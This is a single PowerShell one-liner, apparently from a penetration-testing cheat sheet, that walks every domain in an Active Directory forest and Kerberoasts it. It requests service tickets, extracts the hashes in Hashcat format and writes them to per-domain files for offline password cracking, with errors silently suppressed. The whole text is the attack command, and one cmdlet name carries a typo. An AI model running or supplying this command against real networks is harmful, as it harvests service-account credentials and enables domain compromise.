...
Get-ForestDomain -erroraction silentlycontinue|Select-Object -ExpandProperty Name | ForEach-Object {IInvoke-Kerberoast -erroraction silentlycontinue -domain $_ -OutputFormat Hashcat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII $_-kerb-hashes.txt}
